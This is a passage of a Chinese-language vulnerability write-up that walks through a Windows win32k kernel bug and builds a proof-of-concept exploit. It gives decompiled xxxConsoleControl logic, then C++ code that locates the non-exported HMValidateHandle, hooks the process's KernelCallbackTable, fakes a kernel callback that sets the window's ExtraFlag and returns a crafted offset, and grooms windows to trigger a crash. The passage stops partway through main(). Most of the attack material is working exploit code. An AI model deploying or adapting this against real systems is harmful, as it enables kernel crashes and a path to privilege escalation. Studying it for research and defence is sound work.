  1. 在调用CreateWindow期间(函数没有返回)如何获取窗口句柄
  2. 如何修改tagWND的ExtraFlag
问题1：在参考了网上公开的一些方法后，我选择了一种重利用的方法，这跟池喷射后构造指定大小的空洞来进行控制分配有着相似的地方。简单来说，就是分配一定数量的窗口(窗口类相同)，紧接着销毁这些窗口，然后创建要触发漏洞的窗口(窗口的pExtraBytes为特殊的数值)，触发漏洞的窗口就会被分配到某个刚刚销毁的窗口所在的内存区域。触发漏洞的窗口完成占坑后，我们是怎么获取到窗口句柄的呢？原来我们可以通过一开始创建好的窗口的句柄泄露tagWND在用户态的内存指针，其首地址存储的就是窗口句柄，偏移0xc8处存储的是pExtraBytes，通过对特殊值的比较，就可以搜索到触发漏洞的窗口的用户态tagWND首地址，读取其首地址的值，即可获得其窗口句柄
问题2：大神们发现，`win32kfull!xxxConsoleControl`函数可以设置tagWND的ExtraFlag，调用此函数的用户态API为NtUserConsoleControl
    __int64 __fastcall xxxConsoleControl(int a1, struct _CONSOLE_PROCESS_INFO *a2, int a3)
    {
        ...
        v16 = (_QWORD *)ValidateHwnd(*(_QWORD *)a2);// 获取tagWND的地址
        v17 = (__int64)v16;
        ...
        v18 = v16 + 5;// 获取pwnd的地址(真正的tagWND)
        ...
        // 若ExtraFlag  & 0x800 != 0
        if ( (*(_DWORD *)(*v18 + 0xE8i64) & 0x800) != 0 )
        {
          v23 = (_DWORD *)(*(_QWORD *)(*(_QWORD *)(v17 + 0x18) + 0x80i64) + *(_QWORD *)(v22 + 0x128));
        }
        else
        {
          // 从桌面堆进行分配
          v23 = (_DWORD *)DesktopAlloc(*(_QWORD *)(v17 + 0x18), *(unsigned int *)(v22 + 0xC8), 0i64);
          ...
          if ( *(_QWORD *)(*v18 + 0x128i64) )
          {
            CurrentProcess = PsGetCurrentProcess();
            v30 = *(_DWORD *)(*v18 + 0xC8i64);
            v29 = *(const void **)(*v18 + 0x128i64);
            memmove(v23, v29, v30);
            if ( (*(_DWORD *)(CurrentProcess + 1124) & 0x40000008) == 0 )
              xxxClientFreeWindowClassExtraBytes(v17, *(_QWORD *)(*(_QWORD *)(v17 + 40) + 0x128i64));
          }
          *(_QWORD *)(*v18 + 0x128i64) = (char *)v23 - *(_QWORD *)(*(_QWORD *)(v17 + 24) + 0x80i64);
        }
        if ( v23 )
        {
          *v23 = *((_DWORD *)a2 + 2);
          v23[1] = *((_DWORD *)a2 + 3);
        }
        // 将ExtraFlag |= 0x800u 
        *(_DWORD *)(*v18 + 0xE8i64) |= 0x800u;
        goto LABEL_33;
      }
      ...
    }
在上述问题得以解决后，就可以愉快地编写POC了
  1. 获取一些关键函数地址：HMValidateHandle函数可以根据窗口句柄获取用户态tagWND的地址，虽然它不是导出函数，但是可以在IsMenu函数所在的内存区域进行搜索；NtCallbackReturn函数可以将结果返回给内核，上文已经提及
    VOID InitFunction()
    {
        HMODULE hNtdll = LoadLibraryA("ntdll.dll"), hWin = LoadLibraryA("win32u.dll"), hUser = LoadLibraryA("user32.dll");
        if (!hNtdll || !hWin || !hUser)
        {
            ErrorOutput("[-] Failed to load the ntdll.dll, win32u.dll, user32.dll\n");
        }
        global::NtCallbackReturn = (pNtCallbackReturn)GetProcAddress(hNtdll, "NtCallbackReturn");
        global::NtUserConsoleControl = (pNtUserConsoleControl)GetProcAddress(hWin, "NtUserConsoleControl");
        if (!global::NtCallbackReturn || !global::NtUserConsoleControl)
        {
            ErrorOutput("[-] Failed to get NtCallbackReturn, NtUserConsoleControl\n");
        }
        PBYTE isMenu = (PBYTE)GetProcAddress(hUser, "IsMenu");
        if (!isMenu)
        {
            ErrorOutput("[-] Failed to get NtCallbackReturn, NtUserConsoleControl\n");
        }
        while (*isMenu++ != 0xe8);
        global::HMValidateHandle = (pHMValidateHandle)(isMenu + 4 + (*(PLONG32)isMenu));
        if (!global::HMValidateHandle)
        {
            ErrorOutput("[-] Failed to get HMValidateHandle\n");
        }
    }
  1. 调用VirtualProtect函数修改回调函数表所在的内存页的属性，替换相应的回调函数为自定义的回调函数：__readgsqword(0x60)获取到当前进程的PEB结构地址，PEB结构偏移0x58处就是KernelCallbackTable(回调函数表)
    3: kd> dt ntdll!_PEB KernelCallbackTable
       +0x058 KernelCallbackTable : Ptr64 Void
* * *
    VOID HookCallBack()
    {
        ULONG64 KernelCallbackTable = *(PULONG64)(__readgsqword(0x60) + 0x58);
        if (!KernelCallbackTable)
        {
            printf("[-] Failed to get kernel callback table\n");
            exit(1);
        }
        DWORD oldProtect = 0;
        ULONG64 target = KernelCallbackTable + (0x7B * 8);
        VirtualProtect((LPVOID)target, 0x100, PAGE_EXECUTE_READWRITE, &oldProtect);
        global::orginCallBack = (pCallBack)(*(PULONG64)target);
        *(PULONG64)target = (ULONG64)FakeCallBack;
        VirtualProtect((LPVOID)target, 0x100, oldProtect, &oldProtect);
    }
  1. 自定义的回调函数：NtCallbackReturn用于返回指定的偏移给内核，调用方法仿照_xxxClientAllocWindowClassExtraBytes，NtUserConsoleControl的调用参数有一点讲究，在内核调用xxxConsoleControl之前调用的是NtUserConsoleControl，其中会有一些小检查，即第一个参数不能大于6，第三个参数不能大于0x18
并且在xxxConsoleControl中还有一部分检查，最终决定第一个参数为6，最后一个参数为0x10
    VOID FakeCallBack(PULONG32 para)
    {
        if (*para == global::magicNum && global::flag)
        {
            printf("[+] Enter the fake callback\n");
            HWND target = NULL;
            for (ULONG32 idx = 2; idx < 20; ++idx)
            {
                if (*(PULONG64)(global::pWnds[idx] + 0xc8) == global::magicNum)
                {
                    target = (HWND) * (PULONG64)global::pWnds[idx];
                    printf("[+] Find the target wnd handle: 0x%I64x\n", (ULONG64)target);
                    printf("[+] Find the target wnd address: 0x%I64x\n", (ULONG64)global::pWnds[idx]);
                    break;
                }
            }
            // set flag
            ULONG64 buffer1[2] = { (ULONG64)target, 0 };
            global::NtUserConsoleControl(6, buffer1, 0x10);
            // set offset
            ULONG64 buffer2[3] = { 0x1234, 0, 0 };
            global::NtCallbackReturn(buffer2, 0x18, 0);
        }
        return global::orginCallBack(para);
    }
  1. 窗口的创建与销毁：先创建20个常规的窗口，利用HMValidateHandle泄露窗口地址，再释放2~19号窗口(全部释放也行)，创建触发漏洞窗口，最后将触发漏洞的窗口进行销毁，即可触发BSOD
    int main()
    {
        InitFunction();
        HookCallBack();
        HINSTANCE hInstance = GetModuleHandleA(NULL);
        WNDCLASSA wc{ 0 };
        wc.lpfnWndProc = WindowProc;
        wc.hInstance = hInstance;
        wc.lpszClassName = "Normal";
        wc.cbWndExtra = 0x10;
        ATOM normalClass = RegisterClassA(&wc);